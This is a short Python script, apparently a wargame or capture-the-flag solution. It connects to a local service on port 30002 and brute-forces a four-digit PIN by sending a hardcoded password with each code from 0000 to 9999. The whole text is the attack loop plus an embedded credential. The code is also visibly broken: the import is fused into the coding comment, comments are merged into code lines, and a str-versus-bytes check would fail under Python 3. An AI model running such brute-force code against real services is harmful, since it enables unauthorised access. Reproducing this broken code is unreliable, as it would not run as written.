#!/usr/bin/env python3
# coding: utf-8import sys
import socket
pincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
try:
  # Connect to server
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("127.0.0.1", 30002))
  
  # Print welcome message
  welcome_msg = s.recv(2048)
  print(welcome_msg)    # Try brute-forcing
  while pincode < 10000:
    pincode_string = str(pincode).zfill(4)
    message=password+" "+pincode_string+"\n"        # Send message
    s.sendall(message.encode())
    receive_msg = s.recv(1024)        # Check result
    if "Wrong" in receive_msg:
        print("Wrong PINCODE: %s" % pincode_string)
    else:
        print(receive_msg)
        break
    pincode += 1
finally:
  exit(1)